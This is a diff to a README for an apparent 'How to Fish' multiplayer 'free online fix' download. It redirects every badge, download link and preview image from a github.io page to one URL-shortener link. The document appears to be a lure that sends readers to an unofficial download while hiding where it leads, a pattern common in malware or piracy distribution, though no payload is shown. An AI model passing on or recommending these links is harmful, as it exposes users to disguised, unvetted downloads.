@@ -12,30 +12,30 @@ It focuses on actual multiplayer failure points: Steam Relay initialization, lob
 
 ## Quick Access
 
-[![Online Fix](https://img.shields.io/badge/How%20to%20Fish-Online%20Connection%20Fix-238195?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Steam Relay](https://img.shields.io/badge/Steam-Relay%20Diagnostics-3978c5?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Lobby](https://img.shields.io/badge/Lobby-Join%20Troubleshooting-3eae5b?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Free%20Online%20Fix-256c7e?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Online Fix](https://img.shields.io/badge/How%20to%20Fish-Online%20Connection%20Fix-238195?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Steam Relay](https://img.shields.io/badge/Steam-Relay%20Diagnostics-3978c5?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Lobby](https://img.shields.io/badge/Lobby-Join%20Troubleshooting-3eae5b?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Free%20Online%20Fix-256c7e?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download How to Fish Free Online Fix](https://idleobstacle.github.io/)**
+➡️ **[Download How to Fish Free Online Fix](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![How to Fish Online Fix](assets/how-to-fish-online-fix-preview.png)](https://idleobstacle.github.io/)
+[![How to Fish Online Fix](assets/how-to-fish-online-fix-preview.png)](https://flyn.co/17yeN7/)
 
 ### Steam Relay Dashboard
 
-[![How to Fish Steam Relay Diagnostics](assets/how-to-fish-steam-relay-dashboard.png)](https://idleobstacle.github.io/)
+[![How to Fish Steam Relay Diagnostics](assets/how-to-fish-steam-relay-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Troubleshooting Workflow
 
-[![How to Fish Online Fix Workflow](assets/how-to-fish-online-fix-workflow.png)](https://idleobstacle.github.io/)
+[![How to Fish Online Fix Workflow](assets/how-to-fish-online-fix-workflow.png)](https://flyn.co/17yeN7/)
 
 > Local interface images are project diagnostic mockups. The game artwork above is loaded from the official Steam asset CDN.
 
